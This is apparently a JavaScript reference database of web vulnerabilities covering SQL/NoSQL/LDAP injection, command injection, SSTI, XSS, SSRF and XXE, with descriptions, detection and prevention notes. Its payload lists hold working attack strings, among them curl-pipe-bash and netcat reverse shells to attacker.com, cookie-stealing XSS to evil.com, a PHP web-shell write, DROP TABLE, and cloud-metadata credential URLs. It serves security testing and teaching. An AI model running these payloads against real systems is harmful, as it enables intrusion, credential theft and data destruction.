// Web Vulnerabilities Database — comprehensive reference organized by OWASP category
// Covers injection, XSS, SSRF, XXE, deserialization, auth, access control, and more

export const WEB_VULNS_DB = {
  "Injection": [
    {
      name: "SQL Injection — Union-Based",
      category: "Injection",
      description: "Attacker appends a UNION SELECT to an existing query to extract data from other tables. Requires matching the number of columns in the original query.",
      impact: "Full database read access. Attacker can extract credentials, PII, financial data, and enumerate all database objects.",
      payloads: [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT username,password,NULL FROM users--",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--",
        "' UNION ALL SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users--",
        "' UNION SELECT NULL,NULL,LOAD_FILE('/etc/passwd')--",
        "1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--",
        "' UNION SELECT NULL,NULL,@@version--",
        "' UNION SELECT NULL,NULL,schema_name FROM information_schema.schemata--"
      ],
      detection: "Look for UNION keyword combined with SELECT in user input. WAF rules should detect column enumeration patterns. Monitor for information_schema access in query logs.",
      prevention: "Use parameterized queries / prepared statements. Never concatenate user input into SQL. Apply least-privilege database accounts. Use stored procedures where appropriate.",
      references: ["https://owasp.org/www-community/attacks/SQL_Injection", "https://portswigger.net/web-security/sql-injection/union-attacks"],
      cwes: ["CWE-89"]
    },
    {
      name: "SQL Injection — Blind Boolean-Based",
      category: "Injection",
      description: "Application does not display query results but behaves differently based on whether the injected condition is true or false. Attacker infers data one bit at a time by observing response differences.",
      impact: "Full database read access, but slower extraction. Can enumerate entire databases character by character.",
      payloads: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--",
        "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--",
        "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
        "1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND BINARY SUBSTRING(password,1,1)='$')>0--"
      ],
      detection: "Monitor for repeated similar requests with slight variations. Alert on high request rates to the same endpoint with boolean-like patterns.",
      prevention: "Parameterized queries. Implement rate limiting. Use generic error pages that don't reveal query success/failure.",
      references: ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
      cwes: ["CWE-89"]
    },
    {
      name: "SQL Injection — Blind Time-Based",
      category: "Injection",
      description: "Attacker uses database sleep/delay functions to infer data based on response time. If the condition is true, the response is delayed.",
      impact: "Full database read access. Extremely slow but works even when application gives no visible feedback.",
      payloads: [
        "' AND SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
        "' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--",
        "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        "' OR IF(MID(@@version,1,1)='5',BENCHMARK(10000000,SHA1('test')),0)--",
        "'; IF (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0 WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT SLEEP(5))a)--"
      ],
      detection: "Monitor response times for anomalous delays. Alert on requests containing SLEEP, WAITFOR, pg_sleep, BENCHMARK functions.",
      prevention: "Parameterized queries. Set database query timeouts. Rate limit endpoints.",
      references: ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
      cwes: ["CWE-89"]
    },
    {
      name: "SQL Injection — Error-Based",
      category: "Injection",
      description: "Exploits database error messages that leak data. Attacker crafts queries that produce errors containing extracted information.",
      impact: "Database information disclosure through error messages. Faster than blind techniques.",
      payloads: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(user(),0x7e,version())) USING utf8)))--",
        "' AND EXP(~(SELECT * FROM (SELECT user())a))--",
        "' AND BIGINT UNSIGNED (0xFFFFFFFFFFFFFFFF - (SELECT user()))--",
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      ],
      detection: "Parse error responses for database-specific error patterns. Alert on EXTRACTVALUE, UPDATEXML, CONVERT abuse.",
      prevention: "Parameterized queries. Disable detailed error messages in production. Implement custom error handlers.",
      references: ["https://portswigger.net/web-security/sql-injection"],
      cwes: ["CWE-89", "CWE-209"]
    },
    {
      name: "SQL Injection — Stacked Queries",
      category: "Injection",
      description: "Attacker terminates the original query with a semicolon and appends an entirely new SQL statement. Allows INSERT, UPDATE, DELETE, and administrative commands.",
      impact: "Full database write access. Can modify or delete data, create admin accounts, execute OS commands via xp_cmdshell.",
      payloads: [
        "'; DROP TABLE users;--",
        "'; INSERT INTO users(username,password) VALUES('attacker','password');--",
        "'; UPDATE users SET role='admin' WHERE username='attacker';--",
        "'; EXEC xp_cmdshell('whoami');--",
        "'; CREATE TABLE exfil(data TEXT); INSERT INTO exfil SELECT password FROM users;--",
        "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
        "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
        "'; DECLARE @q VARCHAR(8000); SET @q='\\\\attacker.com\\share\\'+@@version; EXEC master..xp_dirtree @q;--",
        "1; SELECT INTO OUTFILE '/var/www/html/shell.php' FROM (SELECT '<?php system($_GET[\"c\"]);?>');--",
        "'; ALTER USER 'root'@'localhost' IDENTIFIED BY 'hacked';--"
      ],
      detection: "Detect semicolons followed by SQL keywords. Monitor for multiple statement execution in single requests.",
      prevention: "Parameterized queries. Disable multi-statement execution (e.g., PDO::ATTR_EMULATE_PREPARES = false). Least-privilege DB accounts.",
      references: ["https://owasp.org/www-community/attacks/SQL_Injection"],
      cwes: ["CWE-89"]
    },
    {
      name: "SQL Injection — Second-Order",
      category: "Injection",
      description: "Malicious SQL is stored in the database (e.g., during registration) and executed later when the stored value is used in a subsequent query without proper sanitization.",
      impact: "Bypasses input validation applied at insertion time. Can compromise queries that developers assume use trusted data.",
      payloads: [
        "admin'--",
        "admin' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "\\'; DROP TABLE users;--",
        "admin'/*",
        "1' AND (SELECT password FROM users WHERE username='admin')='",
        "test'); INSERT INTO admins VALUES('hacker','password');--"
      ],
      detection: "Audit all database reads that feed into subsequent queries. Trace data flow from storage to query construction.",
      prevention: "Parameterize ALL queries, including those using stored data. Treat all database values as untrusted input.",
      references: ["https://portswigger.net/kb/issues/00100210_sql-injection-second-order"],
      cwes: ["CWE-89"]
    },
    {
      name: "NoSQL Injection",
      category: "Injection",
      description: "Injection attacks against NoSQL databases (MongoDB, CouchDB, etc.). Exploits query operators like $gt, $ne, $regex passed through JSON or query parameters.",
      impact: "Authentication bypass, data extraction, denial of service. Can dump entire collections.",
      payloads: [
        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
        '{"username": "admin", "password": {"$gt": ""}}',
        '{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
        '{"$where": "this.username == \'admin\'"}',
        '{"username": {"$in": ["admin", "root", "administrator"]}}',
        '{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}',
        'username[$ne]=invalid&password[$ne]=invalid',
        'username=admin&password[$regex]=^p',
        'username=admin&password[$gt]=&password[$lt]=z',
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
      ],
      detection: "Reject MongoDB operators ($ne, $gt, $regex, $where, $or, $in) in user input. Validate input types strictly.",
      prevention: "Use MongoDB sanitize libraries (mongo-sanitize). Validate and cast input types. Disable server-side JavaScript ($where). Use Mongoose schema validation.",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"],
      cwes: ["CWE-943"]
    },
    {
      name: "LDAP Injection",
      category: "Injection",
      description: "Manipulation of LDAP queries by injecting special characters like *, (, ), \\, NUL. Common in applications using LDAP for authentication or directory lookups.",
      impact: "Authentication bypass, information disclosure from LDAP directory, privilege escalation.",
      payloads: [
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "admin)(|(password=*))",
        "*)(&(objectClass=*)",
        "*)(objectClass=user)(|(cn=*",
        "admin)(|(objectClass=*))",
        "\\2a)(|(mail=*",
        "admin)(!(&(1=0)))",
        "*))%00",
        "admin)(cn=*))(|(cn=*"
      ],
      detection: "Filter LDAP metacharacters: ( ) * \\ NUL in user input. Monitor LDAP query logs for anomalies.",
      prevention: "Use LDAP-specific encoding functions. Validate input against allowlists. Use parameterized LDAP queries where available.",
      references: ["https://owasp.org/www-community/attacks/LDAP_Injection"],
      cwes: ["CWE-90"]
    },
    {
      name: "XPath Injection",
      category: "Injection",
      description: "Injection into XPath queries used to query XML documents. Similar to SQL injection but targets XML data stores.",
      impact: "Authentication bypass, extraction of XML document data, information disclosure.",
      payloads: [
        "' or '1'='1",
        "' or ''='",
        "'] | //user/*[' ",
        "') or ('1'='1",
        "' or count(//user)>0 or '1'='1",
        "' or string-length(//user[1]/password)>0 or '1'='1",
        "' or substring(//user[1]/password,1,1)='a' or '1'='1",
        "1' or '1'='1' or '1'='1",
        "' or name()='user' or '1'='1",
        "admin' or '1'='1' and '1'='1"
      ],
      detection: "Detect XPath operators and functions in user input. Monitor for enumeration patterns.",
      prevention: "Use parameterized XPath queries (XQuery). Validate and sanitize input. Precompile XPath expressions.",
      references: ["https://owasp.org/www-community/attacks/XPATH_Injection"],
      cwes: ["CWE-643"]
    },
    {
      name: "OS Command Injection",
      category: "Injection",
      description: "Attacker injects operating system commands through application parameters that are passed to system shell functions (exec, system, popen, etc.).",
      impact: "Full server compromise. Remote code execution with the privileges of the web application.",
      payloads: [
        "; whoami",
        "| id",
        "|| cat /etc/passwd",
        "&& cat /etc/shadow",
        "`whoami`",
        "$(whoami)",
        "; curl attacker.com/shell.sh | bash",
        "| nc -e /bin/sh attacker.com 4444",
        "%0a id",
        "'; import os; os.system('id') #",
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1 && whoami",
        "test\nid",
        "{{7*7}}",
        "${IFS}cat${IFS}/etc/passwd"
      ],
      detection: "Detect shell metacharacters: ; | || && ` $() \\n in user input. Use application firewalls to block command patterns.",
      prevention: "Never pass user input to shell commands. Use language-specific APIs instead of shell calls. If unavoidable, use strict allowlists and escapeshellarg().",
      references: ["https://owasp.org/www-community/attacks/Command_Injection"],
      cwes: ["CWE-78"]
    },
    {
      name: "CRLF Injection",
      category: "Injection",
      description: "Injection of carriage return (\\r) and line feed (\\n) characters into HTTP headers or logs. Can lead to HTTP response splitting, log injection, and XSS.",
      impact: "HTTP response splitting, cache poisoning, XSS via injected headers, log forgery.",
      payloads: [
        "%0d%0aSet-Cookie:admin=true",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>pwned</html>",
        "\\r\\nX-Injected: header",
        "%E5%98%8A%E5%98%8DSet-Cookie:admin=true",
        "%0d%0aLocation:http://evil.com",
        "%0aX-Custom:%20injected",
        "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img%20src=x%20onerror=alert(1)>"
      ],
      detection: "Detect CR (0x0D) and LF (0x0A) characters and their encodings in header values.",
      prevention: "Strip or encode \\r and \\n from all user input used in HTTP headers. Use framework header-setting functions that auto-encode.",
      references: ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
      cwes: ["CWE-93"]
    },
    {
      name: "Host Header Injection",
      category: "Injection",
      description: "Application trusts the Host header for generating URLs (password reset links, redirects, caching). Attacker manipulates the Host header to point to their server.",
      impact: "Password reset poisoning, cache poisoning, SSRF, web cache deception, routing-based SSRF.",
      payloads: [
        "Host: evil.com",
        "Host: target.com\\r\\nX-Forwarded-Host: evil.com",
        "Host: target.com:@evil.com",
        "Host: target.com#@evil.com",
        "X-Forwarded-Host: evil.com",
        "X-Host: evil.com",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "Host: evil.com%00target.com",
        "Host: target.com\\nevil.com"
      ],
      detection: "Compare Host header against expected values. Alert on mismatches between Host and the actual server.",
      prevention: "Validate Host header against a whitelist. Use server-configured base URLs instead of Host header. Configure web server to reject unexpected Host values.",
      references: ["https://portswigger.net/web-security/host-header"],
      cwes: ["CWE-644"]
    },
    {
      name: "Email Header Injection",
      category: "Injection",
      description: "Injection of email headers (CC, BCC, Subject) through form fields that feed into email-sending functions. Can turn contact forms into spam relays.",
      impact: "Spam relay, phishing distribution, email spoofing through the application's mail server.",
      payloads: [
        "victim@test.com%0ACc:attacker@evil.com",
        "victim@test.com%0ABcc:attacker@evil.com",
        "victim@test.com\\r\\nBcc: attacker@evil.com",
        "test%0ASubject:Phishing%0A%0AClick here: http://evil.com",
        "victim@test.com%0AContent-Type:text/html%0A%0A<h1>Phished</h1>",
        "test\\nBcc: list@company.com",
        "test%0d%0aCc:spam@evil.com%0d%0aBcc:more@evil.com"
      ],
      detection: "Detect newlines and carriage returns in email form fields. Monitor outbound email volume for anomalies.",
      prevention: "Strip \\r and \\n from all email-related user inputs. Use email libraries that handle header encoding. Validate email addresses strictly.",
      references: ["https://owasp.org/www-community/attacks/Email_Injection"],
      cwes: ["CWE-93"]
    },
    {
      name: "Template Injection — Server-Side (SSTI)",
      category: "Injection",
      description: "User input is embedded into server-side template engines (Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf, etc.) without sanitization, allowing arbitrary code execution.",
      impact: "Remote code execution on the server. Full system compromise.",
      payloads: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{% import os %}{{ os.popen('whoami').read() }}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()"
      ],
      detection: "Test inputs with {{7*7}}, ${7*7}, etc. and check if the output contains 49. Detect template syntax in user input.",
      prevention: "Never pass user input directly into templates. Use sandboxed template engines. Implement strict input validation.",
      references: ["https://portswigger.net/web-security/server-side-template-injection"],
      cwes: ["CWE-1336"]
    }
  ],

  "Cross-Site Scripting (XSS)": [
    {
      name: "Reflected XSS",
      category: "XSS",
      description: "Malicious script is reflected off the web server in error messages, search results, or any response that includes user input. Executes immediately in the victim's browser when they click a crafted link.",
      impact: "Session hijacking, credential theft, phishing, defacement, malware distribution.",
      payloads: [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "javascript:alert(1)//",
        "<iframe src=\"javascript:alert(1)\">",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<a href=\"javascript:void(0)\" onclick=\"alert(1)\">click</a>"
      ],
      detection: "Scan responses for reflected user input containing HTML/JS. Use Content-Security-Policy headers. Implement output encoding.",
      prevention: "HTML-encode all output. Use Content-Security-Policy. Validate input. Use HttpOnly and Secure cookie flags.",
      references: ["https://owasp.org/www-community/attacks/xss/"],
      cwes: ["CWE-79"]
    },
    {
      name: "Stored XSS",
      category: "XSS",
      description: "Malicious script is permanently stored on the target server (in database, message forum, comment field, etc.) and executes whenever a user views the stored content.",
      impact: "Mass user compromise. Self-propagating worms. Persistent phishing. Admin account takeover.",
      payloads: [
        "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
        "<img src=x onerror=\"new Image().src='https://evil.com/log?c='+document.cookie\">",
        "<svg/onload=fetch('https://evil.com/'+document.cookie)>",
        "<script>document.location='https://evil.com/phish'</script>",
        "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><h1>Session Expired</h1><form action=\"https://evil.com/steal\"><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form></div>",
        "test<script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin/users',false);xhr.send();fetch('https://evil.com/exfil',{method:'POST',body:xhr.responseText})</script>"
      ],
      detection: "Scan stored content for HTML/JS on write and read. Use Content-Security-Policy. Monitor for unusual DOM modifications.",
      prevention: "HTML-encode on output. Sanitize HTML input with DOMPurify or similar. Use Content-Security-Policy with nonces. Implement CSP report-uri.",
      references: ["https://owasp.org/www-community/attacks/xss/"],
      cwes: ["CWE-79"]
    },
    {
      name: "DOM-Based XSS",
      category: "XSS",
      description: "Vulnerability exists in client-side JavaScript that processes user input and writes it to the DOM without proper sanitization. The malicious payload never reaches the server.",
      impact: "Client-side code execution. Session theft. Bypasses server-side XSS filters.",
      payloads: [
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "#\"><svg onload=alert(1)>",
        "?default=<script>alert(1)</script>",
        "?search=test#<img/src=x onerror=alert(1)>",
        "?callback=alert(1)//",
        "#'},alert(1),{'t':'",
        "?returnUrl=javascript:alert(1)"
      ],
      detection: "Audit JavaScript for dangerous sinks: innerHTML, outerHTML, document.write, eval, setTimeout/setInterval with string args, location assignment.",
      prevention: "Use textContent instead of innerHTML. Avoid eval and document.write. Sanitize with DOMPurify before DOM insertion. Use trusted types API.",
      references: ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
      cwes: ["CWE-79"]
    },
    {
      name: "Mutation XSS (mXSS)",
      category: "XSS",
      description: "Exploits browser HTML parsing quirks where sanitized HTML is mutated by the browser's parser into executable code. The sanitizer sees safe markup but the browser renders it as dangerous.",
      impact: "Bypasses all client-side sanitizers including DOMPurify (older versions). Extremely difficult to detect.",
      payloads: [
        "<svg><style><img src=x onerror=alert(1)></style></svg>",
        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img onerror=alert(1) src>\">",
        "<svg></p><style><g title=\"</style><img src onerror=alert(1)>\">",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
      ],
      detection: "Keep sanitizer libraries updated. Test with mutation XSS vectors. Audit for innerHTML assignments after sanitization.",
      prevention: "Keep DOMPurify and sanitizers updated. Use Trusted Types. Consider server-side sanitization as defense in depth.",
      references: ["https://cure53.de/fp170.pdf"],
      cwes: ["CWE-79"]
    },
    {
      name: "XSS — Polyglot Payloads",
      category: "XSS",
      description: "Single payloads designed to execute in multiple contexts (attribute, tag, script, URL). Useful for testing when the injection context is unknown.",
      impact: "Versatile attack that works across different injection points without needing to identify the exact context.",
      payloads: [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0ASp%%0telerik%%0D%0AEcIaL/*</stYle/telerik</telerik</titLe/telerik</telerik</texTarEa/telerik</telerik</xMp><sVg/telerik/telerik/oNloAd=alert()//>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "\"><img src=x onerror=alert(1)//><svg/onload=alert(1)//><input/onfocus=alert(1) autofocus>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "<img/src=\"/\"onerror=alert(1)>",
        "\"onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"
      ],
      detection: "Use comprehensive XSS filter lists. Test against polyglot payloads during security assessments.",
      prevention: "Context-aware output encoding. Content-Security-Policy with strict nonces.",
      references: ["https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot"],
      cwes: ["CWE-79"]
    },
    {
      name: "XSS — CSP Bypasses",
      category: "XSS",
      description: "Techniques to bypass Content-Security-Policy headers. Exploits misconfigurations, trusted CDN JSONP endpoints, Angular/Vue template injection, base-uri hijacking.",
      impact: "Renders CSP protection ineffective. Allows script execution despite security headers.",
      payloads: [
        "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        "<base href=\"https://evil.com/\">",
        "<script src=\"/api/jsonp?callback=alert(1)//\"></script>",
        "<link rel=prefetch href=//evil.com>",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<script nonce=\"\">alert(1)</script>",
        "<script src=\"https://www.google.com/complete/search?client=chrome&q=hello&callback=alert\"></script>"
      ],
      detection: "Use CSP Evaluator (csp-evaluator.withgoogle.com). Audit for JSONP endpoints on trusted domains. Check for unsafe-inline, unsafe-eval, wildcard sources.",
      prevention: "Use strict CSP with nonces or hashes. Avoid unsafe-inline and unsafe-eval. Don't whitelist CDNs with JSONP endpoints. Set base-uri to 'self'.",
      references: ["https://portswigger.net/web-security/cross-site-scripting/content-security-policy"],
      cwes: ["CWE-79", "CWE-16"]
    },
    {
      name: "XSS — WAF Bypasses",
      category: "XSS",
      description: "Techniques to evade Web Application Firewall XSS detection rules using encoding, case variation, event handler tricks, and less common HTML elements.",
      impact: "Bypasses WAF protection allowing XSS execution on supposedly protected applications.",
      payloads: [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=\\u0061lert(1)>",
        "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<<script>alert(1)//<</script>",
        "<img src=x onerror=\"top['al'+'ert'](1)\">",
        "<img src=x onerror=window['alert'](1)>",
        "<img src=x onerror=self['ale'+'rt'](1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<details/open/ontoggle=self[atob('YWxlcnQ')](1)>",
        "<img src=x onerror=import('data:text/javascript,alert(1)')>",
        "<%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">"
      ],
      detection: "Use multiple WAF rule layers. Normalize encoding before inspection. Test WAF with evasion payloads regularly.",
      prevention: "Defense in depth: WAF + CSP + output encoding. Keep WAF rules updated. Use allowlist-based validation over blocklist.",
      references: ["https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"],
      cwes: ["CWE-79"]
    }
  ],

  "Server-Side Request Forgery (SSRF)": [
    {
      name: "SSRF — Basic",
      category: "SSRF",
      description: "Attacker causes the server to make HTTP requests to arbitrary destinations. Exploits URL parameters, webhooks, file imports, PDF generators, or any feature that fetches remote resources.",
      impact: "Access internal services, read cloud metadata, port scan internal network, bypass firewalls, access admin panels.",
      payloads: [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0x7f000001",
        "http://2130706433",
        "http://017700000001",
        "http://127.1",
        "http://127.0.0.1:8080/admin",
        "http://internal-api.local/secrets",
        "http://192.168.1.1/admin",
        "http://10.0.0.1/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a"
      ],
      detection: "Monitor outbound requests from the application. Alert on connections to internal IP ranges, localhost, or metadata endpoints.",
      prevention: "Whitelist allowed domains/IPs. Block RFC 1918 ranges and localhost. Disable unnecessary URL schemes (file://, gopher://, dict://). Use network-level controls.",
      references: ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
      cwes: ["CWE-918"]
    },
    {
      name: "SSRF — Blind",
      category: "SSRF",
      description: "Application makes the request but doesn't return the response to the attacker. Data is exfiltrated via DNS lookups, out-of-band HTTP requests to attacker-controlled servers, or timing.",
      impact: "Internal network mapping, service discovery, cloud metadata access without direct response.",
      payloads: [
        "http://burpcollaborator.net",
        "http://evil.com/ssrf-callback",
        "http://169.254.169.254.evil.com",
        "http://internal.service.consul:8500/v1/agent/self",
        "http://metadata.google.internal",
        "https://canary.requestcatcher.com/test"
      ],
      detection: "Monitor DNS queries from the server. Use Burp Collaborator or similar for OOB detection. Track outbound connection attempts.",
      prevention: "Same as basic SSRF plus DNS resolution validation. Resolve DNS before checking against blocklist to prevent TOCTOU.",
      references: ["https://portswigger.net/web-security/ssrf/blind"],
      cwes: ["CWE-918"]
    },
    {
      name: "SSRF — DNS Rebinding",
      category: "SSRF",
      description: "Bypasses SSRF protections that validate hostnames by serving a DNS record that initially resolves to an allowed IP, then changes to an internal IP (127.0.0.1) on the second lookup.",
      impact: "Bypasses hostname-based SSRF filters. Gains access to internal services despite protection measures.",
      payloads: [
        "http://A.1.2.3.4.1time.127.0.0.1.1time.repeat.rebind.network/",
        "http://make-127.0.0.1-rebind-169.254.169.254-rr.1u.ms/",
        "http://7f000001.c0a80001.rbndr.us/",
        "http://rebind.it/rebind/127.0.0.1/1/2/"
      ],
      detection: "Detect DNS rebinding by checking if a domain resolves to different IPs on successive lookups. Pin DNS resolution results.",
      prevention: "Pin DNS resolutions. Validate the resolved IP address, not just the hostname. Use network-level egress filtering.",
      references: ["https://portswigger.net/web-security/ssrf"],
      cwes: ["CWE-918", "CWE-350"]
    },
    {
      name: "SSRF — Cloud Metadata",
      category: "SSRF",
      description: "Access cloud provider metadata endpoints from a compromised server to steal IAM credentials, instance identity tokens, and infrastructure configuration.",
      impact: "Cloud account compromise. Stolen IAM credentials allow lateral movement across cloud resources.",
      payloads: [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.170.2/v2/credentials/",
        "http://[fd00:ec2::254]/latest/meta-data/"
      ],
      detection: "Alert on any connection attempt to 169.254.169.254, metadata.google.internal, or 100.100.100.200 from application code.",
      prevention: "Enforce IMDSv2 (requires token). Use network policies to block metadata access from application containers. Use VPC endpoint policies.",
      references: ["https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html"],
      cwes: ["CWE-918", "CWE-200"]
    }
  ],

  "XML External Entity (XXE)": [
    {
      name: "XXE — Basic File Read",
      category: "XXE",
      description: "Application parses XML input with external entity processing enabled. Attacker defines an external entity pointing to a local file, which gets included in the response.",
      impact: "Read arbitrary files from the server including /etc/passwd, application config files, source code, and private keys.",
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'
      ],
      detection: "Monitor for DOCTYPE declarations in XML input. Detect SYSTEM and PUBLIC entity references.",
